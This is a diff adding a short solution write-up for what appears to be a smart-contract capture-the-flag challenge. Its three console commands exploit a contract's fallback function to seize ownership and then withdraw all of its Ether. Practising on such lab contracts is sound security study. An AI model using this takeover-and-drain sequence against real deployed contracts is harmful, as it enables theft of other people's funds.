@@ -1,3 +1,14 @@
 Solution:
 
+1. Call contribute. Send Ether with ABI call. 
+await contract.contribute.sendTransaction({value:toWei('.0001')})
+
+2. Call fallback.  Send Ether without using ABI.
+await sendTransaction({value:toWei(".00000001"), from:player, to: contract.address})
+I am now the owner.
+
+3. Transfer all funds to yourself.
+await contract.withdraw() 
+
 Other Notes:
+-grab value out of returned JS promise object .then(v => v.toString())
